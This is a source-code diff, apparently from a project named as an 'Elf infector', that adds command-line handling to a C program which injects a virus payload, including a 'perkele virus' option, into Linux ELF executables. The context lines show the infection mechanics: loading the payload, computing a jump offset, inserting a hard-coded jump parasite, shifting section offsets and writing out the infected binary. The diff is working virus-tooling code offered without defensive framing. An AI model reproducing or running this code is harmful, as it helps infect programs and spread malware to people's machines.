@@ -10,15 +10,45 @@
 #include "payload.h"
 
 
-int main(){
+static const char USAGE[] =
+        "Elf infector\n"
+        "Usage:\n"
+        "./infector [-h|-p] <infected_filename> <payload_filename> <output_filename>\n"
+        "Options:\n"
+        "-h --help     Show this screen.\n"
+        "-p     Payload path is a path to perkele virus.\n";
 
-    char *path_to_elf = "ls";
+int main(int argc, char** argv){
+    int is_perkele = 0;
+    char * in_file;
+    char * payload;
+    char * out_file;
+    if(argc < 2){
+        printf("Not enough arguments");
+        return -1;
+    } else if(!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help")){
+        printf("%s", USAGE);
+        return 0;
+    } else if(argc == 5 && !strcmp(argv[1], "-p")){
+        is_perkele = 1;
+        in_file = argv[2];
+        payload = argv[3];
+        out_file = argv[4];
+    } else if(argc == 4){
+        in_file = argv[1];
+        payload = argv[2];
+        out_file = argv[3];
+    } else{
+        printf("Invalid arguments");
+        return -1;
+    }
+    printf("%s, %s, %s\n", in_file, payload, out_file);
     char * host;
     int virus_fd;
     uint8_t* memory;
     size_t virus_size, virus_file_size;
     Elf64_Addr text_off_t, jmp_off_t;
-    get_virus_payload("payload", &virus_fd, &memory, &virus_size, &text_off_t, &virus_file_size);
+    get_virus_payload(payload, &virus_fd, &memory, &virus_size, &text_off_t, &virus_file_size);
     uint8_t *text_section = memory + text_off_t;
     get_jump_offset(memory, virus_size, text_off_t, &jmp_off_t);
     unsigned char * parasite =  (unsigned  char*)"\xE9\xF2\xFC\xFF\xF1";
@@ -31,7 +61,7 @@ int main(){
 
 
 
-    int fd = open(path_to_elf, O_RDWR);
+    int fd = open(in_file, O_RDWR);
     if(fd < 0){
         return -1;
     }
@@ -76,7 +106,7 @@ int main(){
             shdr[i].sh_offset += psize;
         }
     }
-    int out_fd = open("out_file",O_CREAT | O_WRONLY | O_TRUNC, 0777);
+    int out_fd = open(out_file,O_CREAT | O_WRONLY | O_TRUNC, 0777);
     if(out_fd < 0){
         printf("%d", errno);
         return -1;
